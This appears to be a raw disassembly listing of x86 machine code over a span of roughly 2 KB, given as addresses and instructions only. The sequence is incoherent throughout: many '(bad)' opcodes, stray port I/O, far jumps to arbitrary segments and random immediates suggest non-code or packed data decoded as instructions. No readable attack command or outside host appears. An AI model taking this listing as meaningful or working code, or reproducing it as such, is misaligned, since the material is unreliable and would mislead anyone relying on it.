  40579e:	mov    ah,0xf
  4057a0:	call   0xe844:0x6f02aac3
  4057a7:	cdq    
  4057a8:	mov    ah,0x35
  4057aa:	call   0xc535a758
  4057af:	lods   eax,DWORD PTR ds:[esi]
  4057b0:	mov    eax,0x31b9e7a5
  4057b5:	cmp    ebx,DWORD PTR [eax]
  4057b7:	imul   esi,DWORD PTR [esi+edx*8-0x4f],0xffffffa1
  4057bc:	sahf   
  4057bd:	mov    ds:0x789eb2d9,al
  4057c2:	sbb    al,0x93
  4057c4:	(bad)  
  4057c5:	cmp    BYTE PTR [esi],dh
  4057c7:	sub    BYTE PTR [esp+edi*4],bh
  4057ca:	and    eax,0x73aff221
  4057cf:	add    dl,BYTE PTR [ebx+0x13]
  4057d2:	mov    BYTE PTR [esi-0x29f8a9ac],al
  4057d8:	in     eax,0x93
  4057da:	sets   BYTE PTR [ebx-0x7f0bd69b]
  4057e1:	jnp    0x4057f8
  4057e3:	mov    eax,0x1d021cc7
  4057e8:	fsubr  st,st(6)
  4057ea:	(bad)  
  4057eb:	pop    edi
  4057ec:	jmp    0xf2cb:0x18e2902e
  4057f3:	sbb    BYTE PTR [esi+0x28202fd3],ch
  4057f9:	fimul  WORD PTR [eax]
  4057fb:	mov    esp,0x1e267c44
  405800:	ja     0x40582f
  405802:	xor    eax,DWORD PTR [edx+0x7a]
  405805:	lea    esi,[eax]
  405807:	inc    ecx
  405808:	mov    al,BYTE PTR [eax]
  40580a:	out    0xd6,eax
  40580c:	ret    0xa7a7
  40580f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405810:	mov    bh,0x5a
  405812:	aad    0xaa
  405814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405815:	daa    
  405816:	push   edi
  405817:	dec    ebp
  405818:	mov    edi,0x87538561
  40581d:	sar    BYTE PTR [edx-0x45d83d87],cl
  405823:	and    cl,BYTE PTR [bx+si+0x2907]
  405828:	sub    BYTE PTR [esi-0x15a32dcc],dh
  40582e:	jb     0x405854
  405830:	or     al,0xe
  405832:	das    
  405833:	fadd   DWORD PTR [ebp-0x3]
  405836:	adc    ebx,DWORD PTR [ebx-0x5129e4f6]
  40583c:	jo     0x4057d6
  40583e:	mov    ch,0xf1
  405840:	xor    BYTE PTR [ebp+edi*2+0x4e00b30e],bl
  405847:	lods   eax,DWORD PTR ds:[esi]
  405848:	xor    DWORD PTR [edx+0x31],ebp
  40584b:	stos   BYTE PTR es:[edi],al
  40584c:	jnp    0x405809
  40584e:	cmp    BYTE PTR [eax-0x1370be85],0xc1
  405855:	mov    eax,ds:0xa09b31b9
  40585a:	jns    0x40581d
  40585c:	inc    esi
  40585d:	clc    
  40585e:	push   0xffffffea
  405860:	mov    ch,0x2d
  405862:	call   0xd9869f
  405867:	clc    
  405868:	test   al,0x36
  40586a:	in     al,0x35
  40586c:	loop   0x405884
  40586e:	xlat   BYTE PTR ds:[ebx]
  40586f:	and    DWORD PTR [edx+0x4],ebx
  405872:	imul   eax,ecx,0x3bd2ac7
  405878:	test   eax,0x9e54c766
  40587d:	data16 sbb bl,ah
  405880:	(bad)
  405884:	mov    edi,0x29ded46d
  405889:	jb     0x405814
  40588b:	sub    esp,edi
  40588d:	pusha  
  40588e:	push   0xffffffba
  405890:	pusha  
  405891:	ins    DWORD PTR es:[edi],dx
  405892:	xchg   esp,eax
  405893:	stc    
  405894:	(bad)  
  405895:	mov    dh,0x16
  405897:	sbb    eax,0x217eec8e
  40589c:	psubb  mm1,mm0
  40589f:	mov    edi,0xadadabe9
  4058a4:	rcr    BYTE PTR [edx+ebx*8],cl
  4058a7:	add    cl,bh
  4058a9:	outs   dx,BYTE PTR ds:[esi]
  4058aa:	icebp  
  4058ab:	adc    al,0xbc
  4058ad:	or     DWORD PTR [edi+ebx*2-0x22],ebx
  4058b1:	inc    eax
  4058b2:	xchg   BYTE PTR [ecx+0x42f44416],dh
  4058b8:	xor    BYTE PTR [esi-0x5e21a8a2],al
  4058be:	inc    ebx
  4058bf:	jecxz  0x4058e5
  4058c1:	lock dec edi
  4058c3:	inc    esp
  4058c4:	adc    BYTE PTR [ebx+0x56e79bd2],0xb4
  4058cb:	shl    DWORD PTR [eax],cl
  4058cd:	inc    edi
  4058ce:	out    0x61,eax
  4058d0:	cdq    
  4058d1:	outs   dx,BYTE PTR ds:[esi]
  4058d2:	and    BYTE PTR [eax-0xa57b1e6],dh
  4058d8:	add    al,0x3c
  4058da:	jmp    0xbd7c47cf
  4058df:	sub    DWORD PTR [ecx+0x59],0xffffff91
  4058e3:	test   BYTE PTR [ebx+0x6b],al
  4058e6:	(bad)  
  4058e7:	aam    0x6d
  4058e9:	in     al,dx
  4058ea:	add    BYTE PTR [ebx-0x46d7e803],0xf3
  4058f1:	xlat   BYTE PTR ds:[ebx]
  4058f2:	push   ebx
  4058f3:	sbb    eax,0x3e606076
  4058f8:	mov    dh,0xd2
  4058fa:	push   edi
  4058fb:	in     eax,dx
  4058fc:	xchg   ecx,eax
  4058fd:	mov    dl,0xeb
  4058ff:	dec    ecx
  405900:	and    DWORD PTR [edx],edx
  405902:	sbb    al,0xab
  405904:	cmc    
  405905:	sub    BYTE PTR [ecx-0x29],cl
  405908:	(bad)  
  405909:	(bad)  
  40590a:	xlat   BYTE PTR ds:[ebx]
  40590b:	mov    edx,0xc92667e
  405910:	shl    DWORD PTR [ecx+0x18bad00f],1
  405916:	aam    0xfc
  405918:	ret    0xe69
  40591b:	in     eax,0xf2
  40591d:	daa    
  40591e:	add    dl,bh
  405920:	gs xchg esp,eax
  405922:	aas    
  405923:	std    
  405924:	mov    dl,BYTE PTR [edi-0x705a5924]
  40592a:	fcomi  st,st(2)
  40592c:	rol    DWORD PTR [edx+0x8],0xb5
  405930:	(bad)  [esi-0x7d5b4bd1]
  405936:	leave  
  405937:	rcr    ebp,0x21
  40593a:	mov    BYTE PTR [ecx+ebx*4-0x7d],cl
  40593e:	xor    ecx,esp
  405940:	lods   eax,DWORD PTR ds:[esi]
  405941:	xchg   BYTE PTR [ebx],cl
  405943:	adc    eax,0x3b8a170a
  405948:	loope  0x40597f
  40594a:	inc    edx
  40594b:	adc    ecx,edx
  40594d:	leave  
  40594e:	sbb    eax,DWORD PTR [esp+eax*8]
  405951:	lods   eax,DWORD PTR ds:[esi]
  405952:	dec    ecx
  405953:	stc    
  405954:	into   
  405955:	mov    DWORD PTR [esi-0x22],ebp
  405958:	adc    edi,DWORD PTR [eax+ebx*1+0x6cc2833a]
  40595f:	jl     0x405906
  405961:	cli    
  405962:	arpl   WORD PTR [ecx],cx
  405964:	mov    cs,WORD PTR [ebx]
  405966:	leave  
  405967:	enter  0x9df7,0xd7
  40596b:	(bad)  
  40596d:	jne    0x405977
  40596f:	ins    DWORD PTR es:[edi],dx
  405970:	add    al,0x1e
  405972:	fcomp  QWORD PTR ds:0x3e489034
  405978:	add    ebp,DWORD PTR [esi+edx*4+0x30f3a63d]
  40597f:	jns    0x40599d
  405981:	xchg   esi,eax
  405982:	inc    edi
  405983:	fidiv  WORD PTR [esi-0x790d4a04]
  405989:	sub    DWORD PTR [ebp+0x6b5227d9],esi
  40598f:	and    DWORD PTR [eax-0x36],edx
  405992:	jmp    0x18f5907
  405997:	leave  
  405998:	cmp    bl,bh
  40599a:	or     ch,al
  40599c:	(bad)  
  40599d:	fld    TBYTE PTR [esi-0x5fe82dec]
  4059a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a4:	out    0x70,eax
  4059a6:	adc    eax,0x66642969
  4059ab:	fst    DWORD PTR [esi+0x38]
  4059ae:	inc    ebx
  4059af:	rcr    cl,cl
  4059b1:	enter  0xe6f2,0xe7
  4059b5:	gs out dx,al
  4059b7:	loopne 0x405971
  4059b9:	arpl   WORD PTR [edi-0x7a7d2e55],bp
  4059bf:	sbb    bl,dh
  4059c1:	dec    edx
  4059c2:	gs adc eax,0x20db6742
  4059c8:	clc    
  4059c9:	jnp    0x4059b8
  4059cb:	cld    
  4059cc:	jle    0x405a3a
  4059ce:	jne    0x405991
  4059d0:	lea    eax,[ebx+0x0]
  4059d3:	fbld   TBYTE PTR [esi+0x10]
  4059d6:	cmp    al,0x20
  4059d8:	add    eax,0x693d2c19
  4059dd:	xor    DWORD PTR [ecx],ebx
  4059df:	aas    
  4059e0:	adc    eax,0x9dddf98f
  4059e5:	xlat   BYTE PTR ds:[ebx]
  4059e6:	and    eax,0xe77343f9
  4059eb:	mov    eax,ds:0xc7f4706
  4059f0:	or     al,al
  4059f2:	fdivr  DWORD PTR [ebp+esi*4-0x6e]
  4059f6:	rol    DWORD PTR [edx],0xb2
  4059f9:	xlat   BYTE PTR ds:[ebx]
  4059fa:	xchg   ebx,eax
  4059fb:	das    
  4059fc:	test   al,0xff
  4059fe:	scas   al,BYTE PTR es:[edi]
  4059ff:	out    dx,al
  405a00:	sub    eax,0x9d97f21e
  405a05:	(bad)  
  405a06:	scas   eax,DWORD PTR es:[edi]
  405a07:	or     eax,0xa8f61435
  405a0c:	mov    bh,0x99
  405a0e:	in     al,dx
  405a0f:	ret    
  405a10:	ins    BYTE PTR es:[edi],dx
  405a11:	xchg   esi,eax
  405a12:	stos   BYTE PTR es:[edi],al
  405a13:	mov    dl,0xab
  405a15:	pop    ss
  405a16:	sbb    eax,0x79676144
  405a1b:	mov    esi,0xa7b30f4f
  405a20:	loop   0x4059c7
  405a22:	inc    esi
  405a23:	push   eax
  405a24:	add    bh,BYTE PTR [eax-0x5e]
  405a27:	sbb    DWORD PTR [ebp+0x78],0x727df2df
  405a2e:	mov    WORD PTR [edi+0x5f],gs
  405a31:	xor    ch,BYTE PTR [ecx+eiz*8]
  405a34:	sbb    DWORD PTR [ebx+0x68],eax
  405a37:	push   ecx
  405a38:	add    al,0x26
  405a3a:	pop    esp
  405a3b:	sbb    BYTE PTR [ebx-0x2a],0x84
  405a3f:	retf   0x9cc2
  405a42:	jg     0x405a9c
  405a44:	and    DWORD PTR [ebx-0x1ba54c74],esi
  405a4a:	or     esp,DWORD PTR [edx+ecx*2-0xa60a002]
  405a51:	(bad)  
  405a52:	jno    0x405aa8
  405a54:	xor    ah,BYTE PTR [edx+0x1c]
  405a57:	out    dx,al
  405a58:	push   ds
  405a59:	and    al,0xc1
  405a5b:	lea    edi,[eax]
  405a5d:	mov    ah,0x99
  405a5f:	push   esp
  405a60:	xor    al,0x1f
  405a62:	repnz inc ecx
  405a64:	mov    ecx,0x72f87b14
  405a69:	les    ebp,FWORD PTR [ebp-0x1b697048]
  405a6f:	xchg   BYTE PTR [eax],bh
  405a71:	pop    edx
  405a72:	xchg   DWORD PTR [edx+0x1d],esp
  405a75:	(bad)  
  405a76:	xchg   ebx,eax
  405a77:	and    ebx,DWORD PTR [eax]
  405a79:	cmc    
  405a7a:	sub    edi,DWORD PTR [eax]
  405a7c:	stc    
  405a7d:	rcr    BYTE PTR [edi],cl
  405a7f:	xor    DWORD PTR [edi-0x4b284373],edx
  405a85:	cmp    DWORD PTR [esi],ebx
  405a87:	(bad)  
  405a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a89:	outs   dx,DWORD PTR ds:[esi]
  405a8a:	loope  0x405ada
  405a8c:	push   ds
  405a8d:	or     esi,DWORD PTR [edi]
  405a8f:	jg     0x405ad1
  405a91:	fsubr  QWORD PTR [edi-0x2a86273c]
  405a97:	call   0xb84b:0x90076c84
  405a9e:	call   0x57e7:0xb8485a0e
  405aa5:	jno    0x405a4b
  405aa7:	mov    edx,0x64480ec5
  405aac:	push   ecx
  405aad:	fwait
  405aae:	lahf   
  405aaf:	outs   dx,BYTE PTR ds:[esi]
  405ab0:	mov    esp,0x9a03a2b1
  405ab5:	sbb    eax,0x3cdd64d3
  405aba:	jg     0x405a71
  405abc:	data16 lods al,BYTE PTR ds:[si]
  405abf:	mov    edx,0xbff3d8aa
  405ac4:	jmp    0x405b3e
  405ac6:	dec    ebx
  405ac7:	sbb    eax,0x657baf68
  405acc:	fist   DWORD PTR [eax+ecx*8]
  405acf:	outs   dx,DWORD PTR ds:[esi]
  405ad0:	pop    ebx
  405ad1:	loop   0x405ac6
  405ad3:	xor    DWORD PTR [esi+ebx*1-0x1b],ebx
  405ad7:	dec    ebp
  405ad8:	mov    edi,0xf1577648
  405add:	call   0x7dbe1b14
  405ae2:	jno    0x405b1e
  405ae4:	repz jbe 0x405a68
  405ae7:	aas    
  405ae8:	popa   
  405ae9:	loope  0x405b13
  405aeb:	mov    esp,0x74c559d8
  405af0:	loop   0x405ade
  405af2:	(bad)  
  405af3:	nop
  405af4:	cdq    
  405af5:	inc    esp
  405af6:	xchg   edx,eax
  405af7:	imul   esi,DWORD PTR [ebp+0x14],0x39
  405afb:	inc    edi
  405afc:	dec    ebx
  405afd:	and    eax,0xf7331fac
  405b02:	les    ebx,FWORD PTR [eax+0x1a]
  405b05:	repz repz xor dh,ah
  405b09:	arpl   WORD PTR [ecx+0x2],bp
  405b0c:	psraw  mm2,QWORD PTR [ebx-0x1aad0170]
  405b13:	je     0x405b8f
  405b15:	adc    al,0x52
  405b17:	push   0x677301c1
  405b1c:	loop   0x405b93
  405b1e:	xchg   ebp,eax
  405b1f:	add    bh,BYTE PTR [ecx]
  405b21:	iret   
  405b22:	sti    
  405b23:	ds mov bh,0x3f
  405b26:	es and al,0x55
  405b29:	jo     0x405b4d
  405b2b:	jg     0x405ade
  405b2d:	jno    0x405b1e
  405b2f:	fdivr  st,st(2)
  405b31:	shr    DWORD PTR [ebp+edx*4+0x53],cl
  405b35:	lea    ecx,[eax]
  405b37:	std    
  405b38:	and    DWORD PTR [ebp+0x11],edx
  405b3b:	mov    ds:0xe92e7638,al
  405b40:	cmp    eax,0xc15a2cae
  405b45:	and    ebp,ecx
  405b47:	aas    
  405b48:	ins    DWORD PTR es:[edi],dx
  405b49:	adc    eax,0x6059ad75
  405b4e:	xor    ah,BYTE PTR [edi-0x36]
  405b51:	lods   eax,DWORD PTR ds:[esi]
  405b52:	shr    cl,cl
  405b54:	test   al,0x7a
  405b56:	xchg   ecx,eax
  405b57:	out    dx,al
  405b58:	into   
  405b59:	lods   eax,DWORD PTR ds:[esi]
  405b5a:	add    DWORD PTR ds:0x2b7d6429,ebp
  405b60:	mov    WORD PTR [edx],?
  405b62:	out    0xec,al
  405b64:	fsincos 
  405b66:	push   0xd0309df7
  405b6b:	or     DWORD PTR [edx-0x43],edi
  405b6e:	das    
  405b6f:	fs adc al,0xdd
  405b72:	imul   ebx,DWORD PTR [edi-0x3c],0xffffff8a
  405b76:	adc    DWORD PTR [edi-0x71cb1fc9],ebp
  405b7c:	inc    esi
  405b7d:	scas   eax,DWORD PTR es:[edi]
  405b7e:	or     BYTE PTR [edx+0x657922a4],cl
  405b84:	xchg   ecx,eax
  405b85:	in     eax,dx
  405b86:	ffreep st(1)
  405b88:	or     DWORD PTR [edi],eax
  405b8a:	je     0x405bd1
  405b8c:	inc    ebp
  405b8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b8e:	mov    ebp,0xfa92bfb2
  405b93:	or     BYTE PTR [ecx+0x31],0x18
  405b97:	jmp    0x701d3545
  405b9c:	mov    cl,0xfe
  405b9e:	inc    ebp
  405b9f:	and    ch,BYTE PTR [edi]
  405ba1:	adc    eax,0x15a44b90
  405ba6:	mov    WORD PTR [eax-0x5ada2b05],?
  405bac:	int3   
  405bad:	jns    0x405b5f
  405baf:	not    DWORD PTR [edx+0x11fcfdd1]
  405bb5:	cmp    ebp,DWORD PTR [ebp+edi*1+0x38]
  405bb9:	pop    ebp
  405bba:	xor    BYTE PTR [ecx-0x80],dh
  405bbd:	mov    gs,WORD PTR [ebx]
  405bbf:	mov    WORD PTR [ebp-0x77],fs
  405bc2:	or     DWORD PTR ds:0xdfb6ce78,ebx
  405bc8:	(bad)
  405bcb:	inc    ebp
  405bcc:	in     eax,0xa2
  405bce:	mov    ecx,0x518d824d
  405bd3:	sbb    al,0x95
  405bd5:	out    0xa8,al
  405bd7:	shl    BYTE PTR [eax],cl
  405bd9:	enter  0x6297,0xb2
  405bdd:	mov    ebx,0xcddaa6e7
  405be2:	inc    ebp
  405be3:	dec    esp
  405be4:	jno    0x405bdc
  405be6:	bound  ecx,QWORD PTR [edi]
  405be8:	rol    dl,0x4e
  405beb:	popf   
  405bec:	loope  0x405c59
  405bee:	pop    edx
  405bef:	ffree  st(3)
  405bf1:	sti    
  405bf2:	loop   0x405c00
  405bf4:	mov    dh,0x5e
  405bf6:	ins    DWORD PTR es:[edi],dx
  405bf7:	ficomp DWORD PTR [eax+0x38]
  405bfa:	xor    eax,0x9a72ea76
  405bff:	in     al,dx
  405c00:	jns    0x405ba4
  405c02:	jmp    0xfb66:0x1b7e75fb
  405c09:	or     al,dl
  405c0b:	fwait
  405c0c:	sbb    eax,0xfd1ff685
  405c11:	add    eax,0x32eeef83
  405c16:	clc    
  405c17:	cld    
  405c18:	sbb    BYTE PTR ds:0x37f88fcb,0x76
  405c1f:	add    esi,DWORD PTR [ecx+0x7d7ac0a4]
  405c25:	test   al,0xbb
  405c27:	xor    cl,bh
  405c29:	inc    ebx
  405c2a:	cmp    BYTE PTR [ebx-0x61],ah
  405c2d:	cmp    edi,DWORD PTR ds:0xe4e2130d
  405c33:	je     0x405c6d
  405c35:	jge    0x405be3
  405c37:	dec    edx
  405c38:	popf   
  405c39:	retf   0xdbed
  405c3c:	cli    
  405c3d:	xor    dh,bh
  405c3f:	mov    ch,BYTE PTR [edx]
  405c41:	xor    BYTE PTR [ecx+0x3f],dh
  405c44:	popf   
  405c45:	push   ds
  405c46:	loope  0x405ca2
  405c48:	add    ebx,ebx
  405c4a:	pop    ecx
  405c4b:	cmp    ah,BYTE PTR ds:0x9cf44f63
  405c51:	sub    ch,0x6c
  405c54:	and    eax,0x600a14f3
  405c59:	sbb    ecx,DWORD PTR [ebp-0x1d2d9ee6]
  405c5f:	push   ebp
  405c60:	outs   dx,BYTE PTR ds:[esi]
  405c61:	jmp    0x9de5:0x8f755afb
  405c68:	repz imul esp,esi,0xfff9809c
  405c6f:	adc    DWORD PTR [ecx],0x346870b9
  405c75:	adc    eax,0xbc9c8c9a
  405c7a:	or     al,0x56
  405c7c:	xlat   BYTE PTR ds:[ebx]
  405c7d:	jecxz  0x405c3c
  405c7f:	lahf   
  405c80:	imul   esi,DWORD PTR ds:[edi+0x44],0xda0a1c46
  405c88:	push   esi
  405c89:	or     BYTE PTR [ecx],dl
  405c8b:	ret    
  405c8c:	pop    ss
  405c8d:	ret    
  405c8e:	xchg   edi,eax
  405c8f:	in     al,0x43
  405c91:	cmp    DWORD PTR [ecx-0x425315c1],esp
  405c97:	enter  0xad3d,0x91
  405c9b:	dec    edx
  405c9c:	das    
  405c9d:	inc    ebx
  405c9e:	jno    0x405c7a
  405ca0:	mov    cl,0x2e
  405ca2:	not    ebx
  405ca4:	sbb    ecx,eax
  405ca6:	aam    0x18
  405ca8:	pushf  
  405ca9:	jle    0x405c47
  405cab:	ret    0xfa78
  405cae:	out    dx,eax
  405caf:	and    al,0x45
  405cb1:	push   0xd8e5ffc4
  405cb6:	mov    esp,0xa4aa2151
  405cbb:	inc    esi
  405cbc:	xchg   esi,eax
  405cbd:	scas   eax,DWORD PTR es:[edi]
  405cbe:	mov    al,ds:0x1b699c31
  405cc3:	or     esi,DWORD PTR fs:[ebx-0x2d]
  405cc7:	lds    esi,FWORD PTR [edx]
  405cc9:	cmp    dl,dh
  405ccb:	jecxz  0x405c88
  405ccd:	fadd   QWORD PTR [esi]
  405ccf:	add    al,dh
  405cd1:	push   ss
  405cd2:	int3   
  405cd3:	mov    edx,0x201f28fa
  405cd8:	outs   dx,DWORD PTR ds:[esi]
  405cd9:	xor    DWORD PTR cs:[edx+0x733c82c0],ebp
  405ce0:	loopne 0x405cf9
  405ce2:	mov    esi,0x19782ac1
  405ce7:	adc    DWORD PTR [esi+0x78],ecx
  405cea:	arpl   WORD PTR [edi],ax
  405cec:	xchg   esi,edi
  405cee:	std    
  405cef:	sbb    al,0x55
  405cf1:	lock iret 
  405cf3:	xlat   BYTE PTR ds:[ebx]
  405cf4:	lods   al,BYTE PTR ds:[esi]
  405cf5:	test   al,0xeb
  405cf7:	bound  eax,QWORD PTR [eax-0x3b]
  405cfa:	mov    edi,0x5190a874
  405cff:	jg     0x405d7d
  405d01:	adc    eax,0xd0551bca
  405d06:	or     eax,0xd68d2a1a
  405d0b:	adc    DWORD PTR [ebx+0x73],0xa796c2c3
  405d12:	inc    edi
  405d13:	jge    0x405c9f
  405d15:	mov    ds:0x59b3396e,al
  405d1a:	daa    
  405d1b:	loop   0x405cec
  405d1d:	call   0x9e81:0x9fb62011
  405d24:	jb     0x405d63
  405d26:	stos   BYTE PTR es:[edi],al
  405d27:	lods   eax,DWORD PTR ds:[esi]
  405d28:	jno    0x405d55
  405d2a:	pop    esp
  405d2b:	add    DWORD PTR [ebp+eax*2+0x1e],esp
  405d2f:	nop
  405d30:	jbe    0x405cba
  405d32:	xor    dh,BYTE PTR [ebp-0x1]
  405d35:	stc    
  405d36:	fsub   QWORD PTR [edi]
  405d38:	cmc    
  405d39:	jle    0x405d87
  405d3b:	pop    esi
  405d3c:	pushf  
  405d3d:	or     bh,BYTE PTR [edi+0x6ac56cff]
  405d43:	pop    es
  405d44:	aaa    
  405d45:	nop
  405d46:	leave  
  405d47:	sub    BYTE PTR [edx-0x70e654d3],ch
  405d4d:	test   eax,0x6f01a0b2
  405d52:	outs   dx,BYTE PTR ds:[esi]
  405d53:	adc    DWORD PTR [edi],edi
  405d55:	shl    BYTE PTR [edi],1
  405d57:	not    DWORD PTR [edx+0x11]
  405d5a:	popa   
  405d5b:	adc    al,0x7b
  405d5d:	push   ebx
  405d5e:	adc    ebp,DWORD PTR [eax*8-0x1866bebe]
  405d65:	or     dl,0xd
  405d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d69:	(bad)  
  405d6a:	aam    0x3e
  405d6c:	adc    eax,edx
  405d6e:	aad    0x59
  405d70:	or     DWORD PTR ds:0x43f5eb03,esp
  405d76:	cmp    bh,bl
  405d78:	adc    al,0x75
  405d7a:	cmp    DWORD PTR [ecx-0x44],eax
  405d7d:	pop    es
  405d7e:	aas    
  405d7f:	lods   eax,DWORD PTR ds:[esi]
  405d80:	int3   
  405d81:	sub    eax,0xb1ed0bfb
  405d86:	or     edi,eax
  405d88:	xchg   ebp,eax
  405d89:	xchg   ebx,eax
  405d8a:	jb     0x405de8
  405d8c:	mov    al,ds:0x2e4aae64
  405d91:	imul   BYTE PTR [edx]
  405d93:	test   eax,0xc087ebc2
  405d98:	les    edx,FWORD PTR [edx+0x50d4a96f]
  405d9e:	daa    
  405d9f:	pop    eax
  405da0:	pop    edx
  405da1:	(bad)  
  405da2:	push   0xda1ddadc
  405da7:	push   esp
  405da8:	dec    ebp
  405da9:	cmp    dh,ch
  405dab:	not    DWORD PTR ds:0x66eb0bca
  405db1:	std    
  405db2:	shr    ah,1
  405db4:	outs   dx,BYTE PTR ds:[esi]
  405db5:	mov    dl,0x66
  405db7:	div    DWORD PTR [edi-0x7180bfd4]
  405dbd:	mov    eax,0x84d564ec
  405dc2:	pop    esp
  405dc3:	mov    dh,bl
  405dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dc6:	mov    BYTE PTR [ecx],dl
  405dc8:	xchg   ebp,eax
  405dc9:	repz and eax,0x4ed2cb45
  405dcf:	adc    DWORD PTR [eax-0x7e98b38e],edi
  405dd5:	mov    esp,0x55d377e6
  405dda:	xchg   ebx,eax
  405ddb:	dec    edx
  405ddc:	fistp  WORD PTR [ebp+ecx*4-0x5a]
  405de0:	cmp    BYTE PTR [eax+0x68],0x14
  405de4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405de5:	sar    BYTE PTR [esi+0x45f3ffbc],cl
  405deb:	add    esi,DWORD PTR [esi-0x46a0d41c]
  405df1:	fcmove st,st(1)
  405df3:	cmp    al,0x1f
  405df5:	fiadd  DWORD PTR [ebx]
  405df7:	sahf   
  405df8:	or     ah,dl
  405dfa:	into   
  405dfb:	into   
  405dfc:	push   cs
  405dfd:	fist   WORD PTR [edx-0x2f84c3a0]
  405e03:	das    
  405e04:	pop    ecx
  405e05:	popa   
  405e06:	stos   BYTE PTR es:[edi],al
  405e07:	sbb    BYTE PTR [ecx],al
  405e09:	push   ebp
  405e0a:	mul    DWORD PTR gs:[ebx+0x78be4cb8]
  405e11:	cmp    ebx,ebp
  405e13:	mov    eax,0x5b7b5a30
  405e18:	lahf   
  405e19:	dec    edx
  405e1a:	pop    esp
  405e1b:	data16 xchg BYTE PTR [edx+0x65cdd24e],ah
  405e22:	push   esi
  405e23:	inc    ebx
  405e24:	dec    edx
  405e25:	bound  ebp,QWORD PTR [edx-0x29b05964]
  405e2b:	mov    ah,0x6b
  405e2d:	xor    BYTE PTR [edi-0x131867dd],bl
  405e33:	inc    esi
  405e34:	xor    BYTE PTR ds:0xe52c2202,bh
  405e3a:	adc    ebp,DWORD PTR [esi-0x23457ab0]
  405e40:	cs mov esi,0x85bc7ba8
  405e46:	cmp    DWORD PTR [edi+eax*8],0x5
  405e4a:	das    
  405e4b:	sbb    DWORD PTR [eax-0x5eb3e6de],esp
  405e51:	(bad)  
  405e52:	(bad)  
  405e53:	sbb    al,0x43
  405e55:	push   ecx
  405e56:	mov    bh,0xf
  405e58:	js     0x405ea1
  405e5a:	das    
  405e5b:	in     al,dx
  405e5c:	test   BYTE PTR [eax+ebx*4-0x78],ch
  405e60:	mov    esp,0x18b9d9d7
  405e65:	xchg   ebx,eax
  405e66:	scas   eax,DWORD PTR es:[edi]
  405e67:	out    0x46,eax
  405e69:	mov    esi,0xa7e74cc5
  405e6e:	por    mm0,QWORD PTR [edi+eax*8+0x7246f121]
  405e76:	xchg   ebx,eax
  405e77:	xchg   esi,eax
  405e78:	cld    
  405e79:	not    dl
  405e7b:	push   edi
  405e7c:	push   0x59855e
  405e81:	or     al,cl
  405e83:	and    edi,DWORD PTR cs:[ebx-0x22]
  405e87:	gs add eax,0x9f42f184
  405e8d:	ins    BYTE PTR es:[edi],dx
  405e8e:	sahf   
  405e8f:	loope  0x405e24
  405e91:	into   
  405e92:	lahf   
  405e93:	xlat   BYTE PTR ds:[ebx]
  405e94:	or     BYTE PTR [ebp+0x173e33e3],0x13
  405e9b:	shl    bh,0x7f
  405e9e:	pcmpgtb mm4,QWORD PTR [ecx+0x22]
  405ea2:	(bad)  [eax-0x25]
  405ea5:	pop    edi
  405ea6:	fs mov esp,ebp
  405ea9:	mov    ds:0x7150db0d,eax
  405eae:	retf   
  405eaf:	shl    BYTE PTR [edi+ecx*4-0xf],cl
  405eb3:	or     esp,DWORD PTR [edi]
  405eb5:	push   es
  405eb6:	add    edi,DWORD PTR [ecx]
  405eb8:	pop    ebp
  405eb9:	jle    0x405ea4
  405ebb:	adc    DWORD PTR [esi],esi
  405ebd:	dec    esp
  405ebe:	jns    0x405f35
  405ec0:	jg     0x405f27
  405ec2:	cmp    ebx,DWORD PTR ds:0xfb88b3c3
  405ec8:	mov    edx,0x85f82f81
  405ecd:	aaa    
  405ece:	add    DWORD PTR [eax],eax
  405ed0:	pop    ebp
  405ed1:	mov    al,0x92
  405ed3:	jb     0x405ea4
  405ed5:	xor    esp,esp
  405ed7:	sbb    BYTE PTR ds:0x827b7279,dl
  405edd:	mov    al,ds:0x14f9844
  405ee2:	in     al,0x34
  405ee4:	or     DWORD PTR [esi],ebp
  405ee6:	mov    dh,0xae
  405ee8:	sbb    cl,al
  405eea:	pop    esp
  405eeb:	or     al,0x59
  405eed:	rcr    DWORD PTR [edx+0x1],1
  405ef0:	push   cs
  405ef1:	sbb    eax,0x6e0b37ba
  405ef6:	adc    al,0x28
  405ef8:	sub    al,0x26
  405efa:	xor    esi,DWORD PTR [ebx]
  405efc:	shl    BYTE PTR [eax+ebp*1-0x41a67f61],1
  405f03:	pop    ebp
  405f04:	pop    ebp
  405f05:	popa   
  405f06:	push   eax
  405f07:	sti    
  405f08:	mov    es,WORD PTR [eax]
  405f0a:	push   edx
  405f0b:	jl     0x405f06
  405f0d:	or     DWORD PTR [edi+0x71],edx
  405f10:	pusha  
  405f11:	push   edx
  405f12:	lods   eax,DWORD PTR ds:[esi]
  405f13:	retf   
  405f14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f15:	cli    
  405f16:	jo     0x405f72
  405f18:	rep lods eax,DWORD PTR ds:[esi]
  405f1a:	cmp    DWORD PTR [ebx+0x16],edx
  405f1d:	mov    ah,0x6d
  405f1f:	cdq    
  405f20:	add    ah,ch
  405f22:	out    dx,eax
  405f23:	repnz cld 
  405f25:	xchg   edi,eax
  405f26:	retf   0xbaa7
  405f29:	push   edx
  405f2a:	push   edi
  405f2b:	push   ebx
  405f2c:	cld    
  405f2d:	inc    edx
  405f2e:	fwait
  405f2f:	xor    eax,0x93561dda
  405f34:	sbb    DWORD PTR [eax],esp
  405f36:	repnz leave 
  405f38:	addr16 push eax
  405f3a:	inc    edi
  405f3b:	pop    ss
  405f3c:	pop    esp
  405f3d:	imul   edx,edi,0xac6a1fd7
  405f43:	aam    0x8c
  405f45:	cwde   
  405f46:	xchg   esi,eax
  405f47:	xchg   ebx,eax
  405f48:	mov    al,0x3e
  405f4a:	in     eax,dx
  405f4b:	pop    ebx
  405f4c:	jbe    0x405f49
  405f4e:	cli    
  405f4f:	cmp    BYTE PTR [esi],bh
  405f51:	les    edi,FWORD PTR [ecx+0x56250f4d]
  405f57:	in     al,dx
  405f58:	es jp  0x405ee9
  405f5b:	inc    esi
  405f5c:	lock ret 
  405f5e:	sbb    ch,cl
